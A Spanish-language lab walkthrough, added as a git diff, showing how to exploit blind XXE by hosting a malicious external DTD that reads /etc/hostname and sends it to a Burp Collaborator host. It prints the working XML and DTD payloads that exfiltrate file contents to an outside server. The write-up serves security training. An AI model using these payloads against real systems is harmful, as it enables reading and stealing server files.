@@ -537,3 +537,103 @@ Así que al ir a ver el laboratorio nuevamente veremos que nos aparece que esta 
 ![fin](/assets/images/LabsXXE/lab4/fin.png)
 
 > Recuerda apagar el intercept para que se tramite la petición que tenias capturada.
+
+<br>
+
+# Laboratorio 5: Explotación de XXE ciego para exfiltrar datos usando un DTD externo malicioso.
+
+En este laboratorio 5 veremos que nos pide lo siguiente:
+
+![lab5](/assets/images/LabsXXE/lab5/lab5.png)
+
+Nos dice que devemos exfiltrar el archivo llamado /etc/hostname, así que si intentamos inyectar nuestras entidades comunes en la petición XML, no nos mostrará nada, por lo que nos ahorramos algo que ya sabemos que va a pasar, así que en la petición hacemos lo que hicimos en el laboratorio anterior:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://6qxjqifs5yua1hf7d27ch2gga7gx4m.burpcollaborator.net"> %xxe;]>
+	<stockCheck>
+		<productId>
+			1
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+![response](/assets/images/LabsXXE/lab5/response.png)
+
+
+Vemos la petición que hemos interceptado de la función que sabemos que es vulnerable, y también hemos modificado lo que hicimos en el anterior, estamos llamando a un servidor tercero que como sabemos lo hemos hecho usando el burpcollaborator(obviamente una nueva url), para que nos tome un recurso y en este caso nos lo interpretará.
+
+Y al tramitar la petición, vemos que abajo nos ha respondido el mensaje **"XML parsing error"**, pero si vamos al lado del servidor el BurpCollaborator veremos que hemos recibido la petición desde el servidor del laboratorio:
+
+![server](/assets/images/LabsXXE/lab5/server.png)
+
+Hasta ahora esto ya lo habiamos hecho en el laboratorio anterior, pero ahora el nivel nos dice que debemos filtrar un archivo llamado /etc/hostname, por lo que ahora al ir a el laboratorio veremos lo siguiente:
+
+![botones](/assets/images/LabsXXE/lab5/botones.png)
+
+Podemos apreciar que hay 2 opciones nuevas, una para cargar nuestro payload, y otra para subir la flag, iremos a la primera y veremos lo siguiente:
+
+![craft](/assets/images/LabsXXE/lab5/craft.png)
+
+En este apartado es donde vamos a crear nuestro DTD externo, lo que pasa es que en estos laboratorios es necesario hacer esto de forma separada para la seguridad de ellos, así que lo que pasará es que nuestra url del laboratorio apuntará a un archivo que esta dentro de esa misma url, y este archivo será el DTD que vamos a indicarle instrucciónes maliciosas, podemos ver que podemos modificar el nombre del archivo, su contenido y su Header.
+
+En este caso solo modificaremos el contenido, y pondremos el DTD que hará instricciónes maliciosas:
+
+```
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://xcdbuvruomslp2moktnz90fjeak28r.burpcollaborator.net/?content=%file;'>">
+%eval;
+%exfil;
+
+```
+
+Crear una entidad llamada **file** para tomar el archivo /etc/hostname, esta vez usamos el wrapper **file://** y no el de base64 ya que como este archivo solo tiene 1 linea no tendremos problema al recibir la respuesta.
+
+En la segunda linea estamos declarando la entidad llamada **eval**, la cual esta declarando otra entidad dentro de ella, recordemos que el valor **&#x25;** es el simbolo de porcentaje pero en hexadecimal para que no se confunda la sintaxis.
+
+Después en esa subentidad que declaramos llamada **exfil**, contendrá el contenido el cual conecta con nuestro servidor tercero, y como en la primera entidad llamada **file** ya tomamos lo que nos interesa, simplemente lo mostraremos a través de un parametro llamado **content**, el cual llamará a la entidad **file**.
+
+Esto ultimo del parametro, lo que hace es llamar a la entidad **file** la cual contiene el valor del archivo que nos interesa, y se hace de esta manera para que en los registros de nuestro servidor tercero podamos apreciar el contenido de ese archivo.
+
+<br>
+
+Una vez creado nuestro exploit, lo que haremos será tomar la url que nos deja arriba:
+
+![url](/assets/images/LabsXXE/lab5/url.png)
+
+Y ahora desde la petición que teniamos interceptada, pondremos esta url que apunta a nuestro exploit:
+
+![exploit](/assets/images/LabsXXE/lab5/exploit.png)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a92004104741dc7c3ae00b101b80069.exploit-server.net/exploit"> %xxe;]>
+	<stockCheck>
+		<productId>
+			1
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Y al tramitar la petición, lo que sucederá es que el laboratorio de donde interceptamos la petición XML, se comunicará a ese servidor externo nuestro, en este caso es la web que contiene el exploit con las instrucciónes maliciosas, una vez esto, lo que sucederá es que  nuestro servidor del laboratorio donde interceptamos el XML, interpretará las instrucciónes maliciosas que teniamos subidas a nuestro servidor tercero, las interpretara en su propio servidor, por lo que tomara el archivo que queremos de su propio servidor, osea el del laboratorio donde interceptamos el XML.
+
+Una vez que tramitemos esto, iremos a el registro del servidor tercero, osea al burpcollaborator en este caso:
+
+![collab](/assets/images/LabsXXE/lab5/collab.png)
+
+Y podemos apreciar abajo en la respuesta que hemos recibido el contenido del archivo **/etc/hostname**, através del parametro **content**.
+
+Y este valor será la flag para terminar el laboratorio:
+
+![flag](/assets/images/LabsXXE/lab5/flag.png)
+
+Y habremos terminado este nivel:
+
+![end](/assets/images/LabsXXE/lab5/end.png)
